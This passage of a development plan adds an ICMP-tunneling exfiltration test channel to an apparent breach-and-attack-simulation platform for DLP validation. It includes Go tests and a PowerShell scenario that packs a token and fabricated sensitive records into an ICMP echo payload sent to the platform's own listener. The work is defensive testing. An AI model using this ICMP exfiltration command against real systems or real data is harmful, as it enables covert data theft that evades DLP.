git commit -m "feat(icmpsink): wire ICMP sink listener into config and startup"
git push
```

---

## Task 5: Placeholder substitution in `internal/api/dlp_sink.go`

**Files:**
- Modify: `orchestrator/internal/api/dlp_sink.go`
- Modify: `orchestrator/internal/api/dlp_sink_test.go`

**Interfaces:**
- Consumes: nothing new — reuses the existing unconditional `{{SINK_TOKEN}}` block.
- Produces: `func icmpSinkHost(publicBaseURL string) string`.

- [ ] **Step 1: Write the failing tests**

Append to `orchestrator/internal/api/dlp_sink_test.go`:

```go
func TestIssueSinkTokensAndSubstitute_ICMPPlaceholder(t *testing.T) {
	if testing.Short() {
		t.Skip("skipping container-backed test in -short mode")
	}
	sharedDB.RunWithPool(t, func(pool *pgxpool.Pool) {
		h := New(pool, ws.NewHub(), scenario.NewEngine(t.TempDir()), "")
		steps := []scenario.ScenarioStep{
			{TechniqueID: "T1095", Command: "$ping.Send('{{SINK_ICMP_HOST}}', 5000, [Text.Encoding]::ASCII.GetBytes('{{SINK_TOKEN}}data'))"},
		}
		out, err := h.issueSinkTokensAndSubstitute(context.Background(), "run-icmp-1", "https://orchestrator.example:9443", steps)
		if err != nil {
			t.Fatalf("issueSinkTokensAndSubstitute: %v", err)
		}
		cmd := out[0].Command
		if strings.Contains(cmd, "{{SINK_TOKEN}}") || strings.Contains(cmd, "{{SINK_ICMP_HOST}}") {
			t.Fatalf("ICMP placeholders not fully substituted: %s", cmd)
		}
		if !strings.Contains(cmd, "orchestrator.example") {
			t.Fatalf("expected the bare host in the command: %s", cmd)
		}
		if strings.Contains(cmd, "orchestrator.example:9443") {
			t.Fatalf("SINK_ICMP_HOST must not include the port -- ICMP has no port: %s", cmd)
		}

		var tokenLen int
		if err := pool.QueryRow(context.Background(),
			`SELECT length(token) FROM dlp_sink_tokens WHERE run_id = 'run-icmp-1' AND technique_id = 'T1095'`,
		).Scan(&tokenLen); err != nil {
			t.Fatalf("query dlp_sink_tokens: %v", err)
		}
		if tokenLen != 64 {
			t.Fatalf("token length = %d, want 64 (ICMP reuses the existing 32-byte/64-hex-char token)", tokenLen)
		}
	})
}

func TestIssueSinkTokensAndSubstitute_ICMPDoesNotIssueOrphanedSecondToken(t *testing.T) {
	if testing.Short() {
		t.Skip("skipping container-backed test in -short mode")
	}
	sharedDB.RunWithPool(t, func(pool *pgxpool.Pool) {
		h := New(pool, ws.NewHub(), scenario.NewEngine(t.TempDir()), "")
		steps := []scenario.ScenarioStep{
			{TechniqueID: "T1095", Command: "target={{SINK_ICMP_HOST}} token={{SINK_TOKEN}}"},
		}
		if _, err := h.issueSinkTokensAndSubstitute(context.Background(), "run-icmp-orphan", "https://orchestrator.example:9443", steps); err != nil {
			t.Fatalf("issueSinkTokensAndSubstitute: %v", err)
		}
		var count int
		if err := pool.QueryRow(context.Background(),
			`SELECT count(*) FROM dlp_sink_tokens WHERE run_id = 'run-icmp-orphan' AND technique_id = 'T1095'`,
		).Scan(&count); err != nil {
			t.Fatalf("query dlp_sink_tokens: %v", err)
		}
		if count != 1 {
			t.Fatalf("dlp_sink_tokens rows = %d, want exactly 1 (no orphaned second token from the ICMP block)", count)
		}
	})
}

func TestICMPSinkHost_HonorsExplicitOverride(t *testing.T) {
	if testing.Short() {
		t.Skip("skipping container-backed test in -short mode")
	}
	t.Setenv("SINK_ICMP_HOST", "icmp-external.example.net")
	sharedDB.RunWithPool(t, func(pool *pgxpool.Pool) {
		h := New(pool, ws.NewHub(), scenario.NewEngine(t.TempDir()), "")
		steps := []scenario.ScenarioStep{
			{TechniqueID: "T1095", Command: "target={{SINK_ICMP_HOST}}"},
		}
		out, err := h.issueSinkTokensAndSubstitute(context.Background(), "run-icmp-2", "https://orchestrator.example:9443", steps)
		if err != nil {
			t.Fatalf("issueSinkTokensAndSubstitute: %v", err)
		}
		if !strings.Contains(out[0].Command, "icmp-external.example.net") {
			t.Fatalf("expected the SINK_ICMP_HOST override to win over the derived publicBaseURL host: %s", out[0].Command)
		}
	})
}
```

- [ ] **Step 2: Run tests to verify they fail**

Run: `cd orchestrator && go test ./internal/api/... -run ICMP -v 2>&1 | head -40`
Expected: FAIL — `icmpSinkHost` undefined, placeholder unsubstituted.

- [ ] **Step 3: Write the implementation**

In `internal/api/dlp_sink.go`, add a new branch to `issueSinkTokensAndSubstitute` immediately after the existing cloud storage branch:

```go
		if strings.Contains(steps[i].Command, "{{SINK_ICMP_HOST}}") {
			// Same reasoning as every prior host-only/host+port block:
			// does NOT issue its own token. ICMP reuses the existing
			// 32-byte {{SINK_TOKEN}} placeholder directly, embedded in the
			// echo payload -- the unconditional block above already
			// issues and substitutes it whenever present. No
			// {{SINK_ICMP_PORT}} placeholder exists -- ICMP has no port.
			steps[i].Command = strings.ReplaceAll(steps[i].Command, "{{SINK_ICMP_HOST}}", icmpSinkHost(publicBaseURL))
		}
```

Add the helper function after `cloudSinkPort`:

```go
// icmpSinkHost resolves the {{SINK_ICMP_HOST}} placeholder: an explicit
// SINK_ICMP_HOST environment override if set, otherwise the same
// derivation dnsServerHost/sftpSinkHost/smtpSinkHost/cloudSinkHost already
// use -- no new derivation logic. There is no icmpSinkPort -- ICMP has no
// port concept.
func icmpSinkHost(publicBaseURL string) string {
	if v := os.Getenv("SINK_ICMP_HOST"); v != "" {
		return v
	}
	return dnsServerHost(publicBaseURL)
}
```

- [ ] **Step 4: Run tests to verify they pass**

Run: `cd orchestrator && go test ./internal/api/... -run ICMP -v`
Expected: PASS for all 3 new tests.

- [ ] **Step 5: Run the full `internal/api` suite to confirm no regressions**

Run: `cd orchestrator && go test ./internal/api/...`
Expected: PASS, including all existing placeholder tests unchanged. Also confirm `TestRBACMatrix_NoDrift` still passes (this task adds no new routes, so it should be unaffected, but confirm rather than assume — a real regression in this exact test was caught and fixed during the cloud storage channel earlier this session).

- [ ] **Step 6: gofmt and commit**

```bash
cd orchestrator
gofmt -l internal/api/dlp_sink.go internal/api/dlp_sink_test.go
git add internal/api/dlp_sink.go internal/api/dlp_sink_test.go
git commit -m "feat(icmpsink): add SINK_ICMP_HOST placeholder substitution"
git push
```

---

## Task 6: V1 scenario content

**Files:**
- Create: `orchestrator/scenarios/dlp-exfiltration-icmp-tunnel.yaml`
- Create: `orchestrator/scenarios/dlp-exfiltration-icmp-tunnel.yaml.sig`
- Modify: `orchestrator/scenarios/detection-profiles/windows_dlp_exfiltration.yaml`
- Modify: `orchestrator/scenarios/detection-profiles/windows_dlp_exfiltration.yaml.sig`

- [ ] **Step 1: Add the detection-profile entry**

In `orchestrator/scenarios/detection-profiles/windows_dlp_exfiltration.yaml`, add `T1095` to the `technique_ids` list, and append after the existing `dlp-cloud-storage-block` entry:

```yaml
  - id: dlp-icmp-tunnel-block
    provider: trellix_dlp
    type: dlp
    outcome_family: dlp
    expected_outcome: Block
    verification: automatic
    confidence: required
    finding:
      severity: High
      title: "DLP/network controls did not block ICMP-tunneled exfiltration of regulated data"
      remediation: >-
        Confirm network-layer inspection (IDS/IPS, firewall deep-packet
        inspection) detects and blocks ICMP echo requests carrying
        abnormal payload data, independent of any application-layer DLP
        content inspection -- most content-inspection DLP products never
        examine ICMP traffic at all.
      reference: "MITRE ATT&CK T1095 — Non-Application Layer Protocol"
```

- [ ] **Step 2: Write the scenario**

```yaml
id: dlp-exfiltration-icmp-tunnel
name: DLP Exfiltration Validation — ICMP Tunneling Channel
description: >
  Attempts to exfiltrate the same synthetic multi-type sensitive record
  used by every other channel in this program (fabricated PAN, Aadhaar,
  SWIFT/BIC, UPI VPA, and credit-card patterns), this time embedded
  directly in an ICMP echo request's payload -- a network-layer
  exfiltration technique most content-inspection DLP tooling never
  examines at all, independent of every application-layer channel
  already covered.

  Sixth channel of the sink-verified generation of DLP testing (see
  docs/superpowers/specs/2026-09-01-icmp-tunneling-exfiltration-channel-design.md).
  Verdict comes from whether the platform's own purpose-built ICMP
  listener (internal/icmpsink) ever receives an echo request whose
  payload token matches this run -- ground truth resolved server-side,
  never from anything this script can locally confirm. The listener
  always replies to a well-formed echo request exactly like an ordinary
  host would, whether or not the token matches -- a successful ping
  here only proves an echo reply came back, never that the token was
  accepted.

  Unlike the DNS tunneling channel, no chunking/reassembly is needed --
  the whole synthetic record fits in a single ICMP echo request well
  under any practical MTU.

  Safety: all synthetic data is fabricated ([BAS-SIM-DLP] tagged), never
  real. The listener stores only a hash of the received payload, never
  the raw content, and does not log the token either (a tighter bar
  than every other channel in this program). The destination is this
  same on-prem orchestrator; no external host is ever contacted.
  Windows only.
author: Audspect Research
executable: true
supported_os: [windows]
tags:
  - dlp
  - data-protection-validation
  - exfiltration
  - icmp-tunneling
  - windows
  - mitre-attack
  - bfsi
  - india
mitre_phases:
  - collection
  - exfiltration
  - command-and-control

steps:
  - name: "DLP Validation — ICMP Tunneling Exfiltration (T1095)"
    technique_id: T1095
    detection_profiles:
      - windows_dlp_exfiltration
    framework: custom
    executor: powershell
    requires_priv: user
    timeout_sec: 30
    fidelity: telemetry-safe
    production_safe: true
    risk: low
    blast_radius: "Sends a single ICMP echo request carrying a synthetic multi-type sensitive record as its payload to the platform's own ICMP listener (this same on-prem orchestrator). No real destination is ever contacted -- the target is this same on-prem deployment."
    reversible: true
    telemetry:
      - "Sysmon EID 3 (if ICMP is captured by the endpoint's telemetry stack): ICMP echo to the orchestrator's own address"
    detection:
      - "Network/IDS-IPS: ICMP echo request with abnormal payload size/entropy, independent of any application-layer content inspection"
    command: |
      $ErrorActionPreference = 'SilentlyContinue'
      $csvContent = "[BAS-SIM-DLP] CustomerID,PAN,Aadhaar,SWIFT,UPI,CreditCard`nBAS-SIM-SINK,ABCDE1234F,123456789012,SBININBBXXX,fake.user@upi,4111111111111111"
      $token = "{{SINK_TOKEN}}"
      $payload = [System.Text.Encoding]::ASCII.GetBytes("$token$csvContent")
      try {
        $ping = [System.Net.NetworkInformation.Ping]::new()
        $reply = $ping.Send("{{SINK_ICMP_HOST}}", 5000, $payload)
        Write-Output "DLP_OBSERVATION: icmp_ping_status=$($reply.Status)"
        Write-Output "EXEC T1095: ICMP tunneling exfiltration attempt completed (see sink verification for the actual verdict). [BAS-SIM-DLP-ICMP]"
      } catch {
        Write-Output "DLP_OBSERVATION: icmp_ping_exception=$($_.Exception.Message)"
        Write-Output "EXEC T1095: ICMP tunneling exfiltration attempt raised a local exception (see sink verification for the actual verdict). [BAS-SIM-DLP-ICMP]"
      }
      # DLP_OBSERVATION lines are diagnostic evidence only -- a Success
      # status here only proves an echo reply came back (which the
      # listener always sends, matched or not), never that the token was
      # accepted. This step's graded verdict comes entirely from whether
      # a receipt was persisted, resolved server-side by
      # internal/icmpsink + internal/verifysync +
      # internal/reporting's sink-primary dlpVerifier.
    cleanup: ""
```

- [ ] **Step 3: Sign both changed/new scenario files**

```bash
cd orchestrator
go run scripts/signer.go sign private_key.pem ../scenarios/dlp-exfiltration-icmp-tunnel.yaml
go run scripts/signer.go sign private_key.pem ../scenarios/detection-profiles/windows_dlp_exfiltration.yaml
```

- [ ] **Step 4: Verify the scenario loads and its signature checks out**

Create a throwaway test file `orchestrator/zzz_verify_icmp_scenario_test.go`:

```go
package orchestrator

import (
	"testing"

	"github.com/audspect/bas/internal/scenario"
)

func TestZZZVerifyICMPScenarioLoads(t *testing.T) {
	eng := scenario.NewEngine("../scenarios")
	if err := eng.Load(); err != nil {
		t.Fatalf("Load: %v", err)
	}
	sc, ok := eng.Get("dlp-exfiltration-icmp-tunnel")
	if !ok {
		t.Fatal("dlp-exfiltration-icmp-tunnel not found after Load -- check the file and its .sig")
	}
	if len(sc.Steps) != 1 || sc.Steps[0].TechniqueID != "T1095" {
		t.Fatalf("unexpected scenario shape: %+v", sc)
	}
}
```

Run: `cd orchestrator && go test . -run TestZZZVerifyICMPScenarioLoads -v`
Expected: PASS.

Delete the throwaway test file afterward — it must never be committed:

```bash
rm orchestrator/zzz_verify_icmp_scenario_test.go
```

- [ ] **Step 5: Commit**

```bash
cd orchestrator
git add scenarios/dlp-exfiltration-icmp-tunnel.yaml scenarios/dlp-exfiltration-icmp-tunnel.yaml.sig \
  scenarios/detection-profiles/windows_dlp_exfiltration.yaml \
  scenarios/detection-profiles/windows_dlp_exfiltration.yaml.sig
git commit -m "feat(scenarios): ICMP tunneling DLP exfiltration channel (T1095)"
git push
```

---

## Task 7: Full verification and handoff

**Files:** none (verification only).

- [ ] **Step 1: Run the full affected-package suite**

Run: `cd orchestrator && go test ./internal/icmpsink/... ./internal/api/... ./internal/verifysync/... ./internal/reporting/... -v 2>&1 | tail -100`
Expected: PASS throughout. Confirm zero changes were needed to `internal/verifysync.annotateSinkReceipts` or `internal/reporting.dlpVerifier` — both already only check "does at least one receipt exist for this token."

- [ ] **Step 2: Run the broader build and gofmt check**

```bash
cd orchestrator
go build ./...
gofmt -l internal/icmpsink/*.go internal/api/dlp_sink.go internal/api/dlp_sink_test.go cmd/server/main.go config/config.go
go vet ./internal/icmpsink/...
```

Expected: clean build, no gofmt output, no vet issues.

- [ ] **Step 3: Final commit if Steps 1-2 required any fixes**

If any test or build failure surfaced above required a code fix, commit and push it now with a `fix(icmpsink): ...` message. If everything was already green, this step is a no-op.

---

## Self-Review Notes

- **Spec coverage:** the acceptance checklist (Task 1), decoupled reply/validation (Task 3's `handlePacket`), byte ceiling + rate limiting + tightened token-free logging (Task 2/3), placeholder substitution with the ICMP-specific no-port design (Task 5), V1 scenario content (Task 6), testing (spread across every task's TDD steps plus Task 7's full-suite run). No section of the spec is without a corresponding task.
- **Deliberate difference from every prior channel's plan:** Task 1 exists *only* to prove feasibility before any durable code is written — no other channel's plan needed this, because no other channel's core assumption (an unprivileged raw-ish socket working in this specific container) was genuinely unverified going in. This is not scope creep; it's the direct implementation of the spec's own explicit "prove it before building on it" decision.
- **Type consistency:** `Status`, `Listener`, `NewListener`, `LocalAddr`, `Close`, `Serve`, `StartListener` match `internal/dnssink`'s exact names/signatures (minus the `domainSuffix` parameter DNS needed and ICMP doesn't). `icmpSinkHost` matches `sftpSinkHost`/`smtpSinkHost`/`cloudSinkHost`'s exact shape; deliberately has no `icmpSinkPort` counterpart, consistent with ICMP having no port concept anywhere else in this plan.
- **Placeholder scan:** no TBD/TODO. Task 1 Step 4's "stop and report back" instruction is a concrete, actionable contingency for a specific named risk (the sysctl not propagating, or not being supported in this exact environment), not an unresolved design question left in this plan.
